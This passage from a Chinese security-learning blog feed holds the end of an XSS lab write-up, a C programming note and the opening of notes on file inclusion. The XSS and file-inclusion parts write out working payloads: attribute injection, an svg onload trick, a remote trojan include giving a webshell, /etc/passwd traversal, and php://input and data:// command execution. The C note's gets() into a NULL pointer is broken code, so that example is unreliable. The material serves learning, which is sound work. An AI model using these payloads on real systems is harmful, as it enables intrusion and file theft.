class="variable">$str</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这次是要求在cookie部分传参了,依旧尝试之前的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie: user=<span class="string">&#x27;&quot;onclick=alert(1) type=&quot;text&quot; //</span></span><br></pre></td></tr></table></figure><p>没啥好说的,成功</p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h3><p>本关来源网站g了,直接看下一关</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>进去后发现网站用get请求传了个src参数,先看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level16.php?keyword=test&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;src&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那么发现主要的问题就出在”ng-include”这里,通过搜索发现就是一个简单的文件包含作用</p><p>这时我们可以尝试引用其他关,并利用其他关的漏洞执行js代码通过本关,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=<span class="string">&#x27;level1.php?name=&lt;a href=&quot;javascript:alert(1)&quot;&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p>这样我们点击超链接就能通过了</p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h3><p>没发现什么,看看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>发现这关的过滤导致我们不能用js标签或是js伪协议,且过滤了斜杠不能用双标签,还需绕过过滤空格</p><p>那么我们可以构建这样的payload,通过加载一张svg图片执行js代码,并且用%0a绕过过滤空格(%0a为回车符,在html中合法读成空格执行)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg%0aonload=<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)&gt; </span><br></pre></td></tr></table></figure><h3 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h3><p>先注意本关需要用chrome浏览器,发现是会加载插件</p><p>那我们可以构造这样的payload</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=<span class="title function_">alert</span>(<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样鼠标移动到此插件就能触发js代码</p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h3><p>和上题做法相同</p><h3 id="level-19-20"><a href="#level-19-20" class="headerlink" title="level 19-20"></a>level 19-20</h3><p>这两道题目环境有问题,本靶场潦草收场</p>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>培训笔记2</title>
      <link href="/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/"/>
      <url>/2023/10/18/%E5%9F%B9%E8%AE%AD%E7%AC%94%E8%AE%B0-2023-10-18-%E7%AC%94%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="实用技巧"><a href="#实用技巧" class="headerlink" title="实用技巧"></a>实用技巧</h2><h3 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h3><ol><li><p>复制粘贴剪贴撤回: Ctrl + c &#x2F; v &#x2F; x &#x2F; z</p></li><li><p>移动代码块: Alt + 上下 或 鼠标拖动</p></li><li><p>快速复制: Alt + Shift + 上下</p></li><li><p>注释代码: Ctrl + ／</p></li><li><p>缩进: Tab &#x2F; Shift + Tab</p></li><li><p>删除单个单词: Ctrl + Backspace</p></li><li><p>切换窗口: Ctrl + Tab 应用内切换窗口<br>      Alt + Tab 切换所有窗口<br>      Win + Tab 切换应用</p></li></ol><h3 id="使用工具-软件"><a href="#使用工具-软件" class="headerlink" title="使用工具 &amp; 软件"></a>使用工具 &amp; 软件</h3><ol><li><p>截图: Ctrl + Alt + A (QQ) &#x2F; Win + Shift + S (系统)</p></li><li><p>录制: Win + G(系统) &#x2F; OBS</p></li><li><p>笔记: Typora, Obsidian, 飞书云文档, Hexo搭建博客</p></li><li><p>视频课资源: MOOC,BiliBili</p></li><li><p>文件查找: everything</p></li><li><p>思维导图: Xmind</p></li><li><p>电脑防护: 火绒</p></li><li><p>博客 &amp; 文档: 知乎,稀土掘金,Stack Overflow,Github,GPT</p></li></ol><h2 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h2><p>格式化输入输出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;格式化字符&quot;</span>,参数列表);</span><br><span class="line"><span class="comment">// 没有参数时</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;非格式字符串&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">6</span>;</span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line">    <span class="type">float</span> f = <span class="number">2.0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %c %f\n&quot;</span>,value,ch,f);<span class="comment">/*输出变量，变量之间空格，并在最后换行*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>首先，scanf函数在读取除字符之外的输入的时候会遵守以下原则：<br>scanf函数每次读取一个字符，跳过所有的空白字符，直到遇到第一个非空白字符的时候才开始读取。</p><p>然后，scanf以删除的方式从缓冲区读入数据(来自标准输入设备的数据存储在缓冲区)<br>也就是说，scanf从缓冲区读入一个数据项，该数据项在缓冲区中就被清除掉了。而如果scanf需要读取一个数据项，发现缓冲区当前是空的，那么程序就会在scanf代码处阻塞，等待用户输入，scanf函数接收到相应的数据项之后，在缓冲区中将这一数据项清除，scanf函数返回，程序继续执行。</p><h3 id="缓冲区"><a href="#缓冲区" class="headerlink" title="缓冲区"></a>缓冲区</h3><p>是内存空间的一部分。也就是说，在内存中预留了一定的存储空间，用来暂时保存输入或输出的数据，这部分预留的空间就叫做缓冲区。缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区_和输出缓冲区。_</p><p>scanf遇到空格，回车，tab都可以结束输入，gets只有回车能结束输入（至少输入一个字符或数字）</p><h3 id="字符输入输出"><a href="#字符输入输出" class="headerlink" title="字符输入输出"></a>字符输入输出</h3><h4 id="字符输出函数—-putchar"><a href="#字符输出函数—-putchar" class="headerlink" title="字符输出函数—-putchar()"></a>字符输出函数—-putchar()</h4><p>把从输出缓冲区中读取单个字符输出到标准输出设备</p><p>putchar(变量)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">67</span>;        <span class="comment">/*定义一个整型变量*/</span></span><br><span class="line">    <span class="type">char</span> ch = <span class="string">&#x27;C&#x27;</span>;    <span class="comment">/*定义一个字符变量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">putchar</span>(i);        <span class="comment">/*数字 67 的 ASCII是大写字母 C*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);    <span class="comment">/*换行效果，屏幕不显示*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);    <span class="comment">/*输出字符变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;C&#x27;</span>);    <span class="comment">/*输出字符常量*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符输入函数—-getchar"><a href="#字符输入函数—-getchar" class="headerlink" title="字符输入函数—-getchar()"></a>字符输入函数—-getchar()</h4><p>从输入缓冲区上读取单个字符，返回值是字符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> ch = <span class="number">0</span>;<span class="comment">/*初始化变量*/</span></span><br><span class="line"></span><br><span class="line">    ch = getchar();<span class="comment">/*字符输入*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(ch);<span class="comment">/*输出变量*/</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);<span class="comment">/*换行*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串输入输出"><a href="#字符串输入输出" class="headerlink" title="字符串输入输出"></a>字符串输入输出</h3><p>我们在编程的时候，经常要对字符进行操作</p><h4 id="字符串输出函数—-puts"><a href="#字符串输出函数—-puts" class="headerlink" title="字符串输出函数—-puts()"></a>字符串输出函数—-puts()</h4><p>从缓冲区中读取已经存在的字符串（包括空白字符）输出到标准输出设备并换行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s);<span class="comment">/*s 为字符串变量*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[] = <span class="string">&quot;hello world!&quot;</span>;<span class="comment">/*定义一个数组，储存了一串字符串*/</span></span><br><span class="line">    <span class="type">char</span>* s=<span class="literal">NULL</span>;    <span class="comment">/*定义一个指针变量，初始化为空*/</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;hello world!&quot;</span>;    <span class="comment">/*指针指向一个字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>格式里的字符串变量s在这里是数组 str 和指针 s。puts() 函数的作用与printf(“%s\n”,s)相同—–输出字符串并换行。</p><p>注 意：<br>①数组是同一类型的数据的集合，指针是用来表示内存地址的。后面会独立的介绍，在这里只要知道数组变量和指针变量可以存储字符串就行了。②puts()函数在遇到”\0”时，就会被替换为 “\n”，实现换行。</p><h4 id="字符串输入函数—–gets"><a href="#字符串输入函数—–gets" class="headerlink" title="字符串输入函数—–gets()"></a>字符串输入函数—–gets()</h4><p>读取输入缓冲区中存在的字符，直到遇到回车结束</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">26</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> *s = <span class="literal">NULL</span>;<span class="comment">/*定义一个数组和一个指针变量*/</span></span><br><span class="line"></span><br><span class="line">    gets(str);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    gets(s);<span class="comment">/*获取输入的字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(str);<span class="comment">/*输出字符串*/</span></span><br><span class="line">    <span class="built_in">puts</span>(s);<span class="comment">/*输出字符串*/</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：<br>①用 gets 函数获取的字符串一般是放在字符变量里，也是使用数组变量和指针变量。gets 函数除了有输入字符的功能外，还有换行的作用。<br>②scanf()函数和gets()函数有明显区别，scanf函数在遇到空格、回车、空白符时结束输入，gets ()函数仅在遇到回车时结束输入。</p><h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><ol><li>写注释</li><li>变量命名（不能太随便太奇怪）</li><li>空行：独立代码块之间要空行<br>每个函数定义结束要空行等</li><li>缩进：if，switch，for等（条件下内部执行的语句要缩进）<strong>特殊</strong>：只有一条if可以放一行</li><li>分行：定义变量可以一个变量分一列</li><li>减少嵌套</li><li>空格：等号大小于号等双目运算符左右要空格(单目运算符前后不空格，如正负号)</li></ol><h2 id="分支"><a href="#分支" class="headerlink" title="分支"></a>分支</h2><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><p>&amp;&amp;优先级大于||：在没有括号的情况下，||左右可以有带&amp;&amp;的组合式（优先结合&amp;&amp;）</p><p>if的括号里可以赋值，返回值就是赋的值：如if(a&#x3D;0)则返回值是0，不执行结果</p><h3 id="短路特性"><a href="#短路特性" class="headerlink" title="短路特性"></a>短路特性</h3><ol><li>如果if成立，<br>  不再执行后面的else if和else</li><li>如果&amp;&amp;的前面不成立，<br> 不再执行后面的内容</li><li>如果||的前面成立，<br>  不再执行后面的内容<br>多用于if赋值的情形</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 短路特性 例子1-1</span></span><br><span class="line"> <span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"> <span class="keyword">if</span>((a = a &lt; b) || (c = <span class="number">3</span>)) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>如以上结果输出a&#x3D;1,c&#x3D;4<br>因为先判断a&lt;b部分结果为真返回1赋值给a,那么此时a为1<br>那么在||运算符中前部分为真就已经可以使其生效,那么后面的c&#x3D;3语句就不再执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//例子1-2</span></span><br><span class="line"><span class="type">int</span> a = <span class="number">2</span>, b = <span class="number">3</span>, c = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">if</span>((a /= b) &amp;&amp; (c = a-b)) &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;qwq&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a = %d , c = %d&quot;</span>, a, c);</span><br></pre></td></tr></table></figure><p>以上结果输出a&#x3D;0,c&#x3D;4<br>因为a &#x2F;&#x3D; b的结果保留整数为0,此时a为0<br>对于&amp;&amp;运算符必须前后都为真才能生效,那么前部分为0已经为假此语句已经失效,所以后面的c &#x3D; a-b语句不再执行</p><h3 id="三目运算符"><a href="#三目运算符" class="headerlink" title="三目运算符"></a>三目运算符</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span> ? 表达式<span class="number">2</span> : 表达式<span class="number">3</span></span><br></pre></td></tr></table></figure><p>若表达式1为真执行表达式2,为假执行表达式3</p><p>并且三目运算符可以嵌套,例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">计算结果=表达式<span class="number">1</span>   ?   表达式<span class="number">2</span>   :   表达式<span class="number">3</span>   ?   表达式<span class="number">4</span>  :   表达式<span class="number">5</span></span><br></pre></td></tr></table></figure><h3 id="switch-case语句"><a href="#switch-case语句" class="headerlink" title="switch,case语句"></a>switch,case语句</h3><p>case后面只能是整型或char类型的常量（即整数和单字符’  ‘里面可以是数字和大小写字母等，注意1和’1’是不一样的）</p><p>case后面只能是常量，我们可以预先定义常量：</p><ol><li><p>define定义</p></li><li><p>const定义</p></li></ol><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>while循环的语法结构类似于if语句</p><p>while循环中一定要注意在循环体内调整循环的次数</p><h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><p>for(初始化 ; 判断条件 ; 条件变量调整）<br>如for( a&#x3D;1 ; a&lt;6 ; a++ ）<br>for循环的三个表达式都可以省略<br>for( ; ; )依然可以执行（无限&#x2F;死循环）<br>表达式2只要不是0都可以执行(输入一个非零数字或者空着都代表无限&#x2F;死循环)<br>☆如果第二项为“非”直接跳出循环，不再执行第三项<br>☆第三项为单纯的a++和++a没有区别，但如果在第三项中调用a的值，则不同</p><h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>无论是三个循环中的哪一个，都可以在循环体中任意位置使用break和continue，break的作用是在满足你设置好的条件语句后，结束循环，而continue是跳过循环体中在continue之后的所有语句，开始进入下一次循环的流程</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>周记2-文件包含,XSS,文件上传</title>
      <link href="/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/"/>
      <url>/2023/10/15/%E5%91%A8%E8%AE%B0-2023-10-15-%E5%91%A8%E8%AE%B02/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>通过php函数引入文件时，传入的文件名没有经过合理的验证，从而操作了预想之外的文件，就可能导致意外的文件泄漏甚至恶意代码注入。<br>而主要就是php中include()函数:包含并运行指定文件。</p><h3 id="通过远程代码生成webshell"><a href="#通过远程代码生成webshell" class="headerlink" title="通过远程代码生成webshell"></a>通过远程代码生成webshell</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我自建一个111.230.199.201&#x2F;test.txt这样的网站文件并在此写入木马,那么通过以下语句就能使目标网站运行我的恶意文件做到生成webshell</p><p>?file&#x3D;<a href="http://111.230.199.201/test.txt">http://111.230.199.201/test.txt</a><br>条件：allow_url_fopen、allow_url_include为on</p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>如果是linux，可以以绝对路径查看?file&#x3D;&#x2F;etc&#x2F;passwd等敏感文件或是查看相对路径?file&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd等敏感文件</p><p>还可以加一些不存在的目录名，进行穿越、绕过,例如:?file&#x3D;&#x2F;etc&#x2F;ytm666&#x2F;..&#x2F;passwd</p><p>也可以使用file:&#x2F;&#x2F;伪协议:?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>而此伪协议的作用也是用来读取文件,以下重点介绍php伪协议来利用漏洞</p><h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="通过php-filter查看源代码"><a href="#通过php-filter查看源代码" class="headerlink" title="通过php:&#x2F;&#x2F;filter查看源代码"></a>通过php:&#x2F;&#x2F;filter查看源代码</h4><p>构造这种形式的语句可以读取目标文件的源码并进行base64编码</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p><p>而这样可以读取到源码中的注释部分,且这样的方式也可以进行目录穿越的操作,如:</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;<strong>ytm666</strong>&#x2F;resource&#x3D;index.php</p><p>这种形式会使页面报错,但源码依旧会显示出来,所以没有影响.那么这种写法可以绕过一些对于路径有要求的题目,比如要求路径必须包含某些字符,就可以以这种方式绕过</p><h4 id="通过php-input伪协议进行命令执行"><a href="#通过php-input伪协议进行命令执行" class="headerlink" title="通过php:&#x2F;&#x2F;input伪协议进行命令执行"></a>通过php:&#x2F;&#x2F;input伪协议进行命令执行</h4><p>可以将php代码以post请求形式发送执行但要求allow_url_include为on,例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ?file=php:<span class="comment">//input</span></span><br><span class="line">POST: <span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;dir&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="将php代码使用data-伪协议发送执行"><a href="#将php代码使用data-伪协议发送执行" class="headerlink" title="将php代码使用data:&#x2F;&#x2F;伪协议发送执行"></a>将php代码使用data:&#x2F;&#x2F;伪协议发送执行</h4><p>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJkaXIiKTs&#x2F;Pg&#x3D;&#x3D;<br>条件：allow_url_fopen、allow_url_include为on</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 